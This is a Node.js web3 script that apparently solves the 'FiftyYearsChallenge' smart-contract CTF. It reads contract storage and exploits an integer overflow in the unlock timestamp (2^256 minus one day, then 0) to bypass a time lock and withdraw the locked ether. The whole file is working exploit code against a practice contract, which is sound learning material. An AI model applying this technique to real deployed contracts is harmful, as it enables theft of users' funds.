require('dotenv-safe').config();
const assert = require('assert')
const debug = require('debug')('app:index')
const { createWeb3, network } = require('../web3')
const { storageArray } = require('../evm-storage')
const { createContract } = require('../contracts')
const { createDeployedStore, deployedStorePath } = require('../deployed')

const CHALLENGE_CONTRACT_NAME = 'FiftyYearsChallenge'

const web3 = createWeb3()

async function main() {
  const store = createDeployedStore(deployedStorePath(network))

  const $createContract = createContract(web3, {
    gas: 2000000,
    from: web3.eth.defaultAccount,
  })

  const challenge = await Promise.resolve(CHALLENGE_CONTRACT_NAME)
    .then(contractName => {
      const address = store.get(contractName)
      const instance = $createContract(contractName, address)
      return (
        address
          ? instance
          : instance
              .deploy({
                arguments: [web3.eth.defaultAccount]
              }).send({
                value: web3.utils.toWei('1', 'ether')
              }).then(inst => {
                assert(inst.options.address, 'No contract address!')
                debug('deployed new contract', contractName, 'at', inst.options.address)
                store.set(contractName, inst.options.address)
                return inst
              })
      )
  })

  const hexToNumberString = web3.utils.hexToNumberString
  const hexToNumber = web3.utils.hexToNumber
  const toHex = web3.utils.toHex
  const BN = web3.utils.BN

  /**
   * @param {number|string} position
   */
  const getStorageAt = (position) => web3.eth.getStorageAt(challenge.options.address, position)
  const $array = storageArray(getStorageAt)

  const owner = await getStorageAt(2)
  debug({ owner })

  async function printBalanceAndStorage() {
    const balance = await web3.eth.getBalance(challenge.options.address)
    debug({ balance })

    const queueLength = await getStorageAt(0).then(hexToNumber)
    debug({ queueLength })

    const head = await getStorageAt(1)
    debug({ head })

    const $queue = $array({
      amount: 0,
      unlockTimestamp: 1,
    }, 0)

    const translateItem = (item) => ({
      amount: hexToNumberString(item.amount),
      unlockTimestamp: hexToNumberString(item.unlockTimestamp),
    })

    for (let i = 0; i < queueLength; i++) {
      debug( {
        [`item${i}`]: await $queue.getItem(i).then(translateItem)
      })
    }
  }

  await printBalanceAndStorage()

  let isComplete = await challenge.methods.isComplete().call()
  debug({ isComplete })
  if (isComplete) {
    return;
  }

  const oneDayInSeconds = 24 * 60 * 60

  // 0x10000000000000000000000000000000000000000000000000000000000000000 - 86400
  const timeStamp1 = toHex((new BN(1)).shln(256).subn(oneDayInSeconds))
  await challenge.methods.upsert(1, timeStamp1).send({
    value: 1, // wei
  })

  debug('-------STEP 1------')
  await printBalanceAndStorage()

  const timeStamp2 = 0
  await challenge.methods.upsert(1, timeStamp2).send({
    value: 1, // wei
  })

  debug('-------STEP 2------')
  await printBalanceAndStorage()

  debug('-------STEP 3------')
  debug('withdrawing funds...')
  await challenge.methods.withdraw(1).send()
  await printBalanceAndStorage()

  isComplete = await challenge.methods.isComplete().call()
  debug({ isComplete })
}

main()
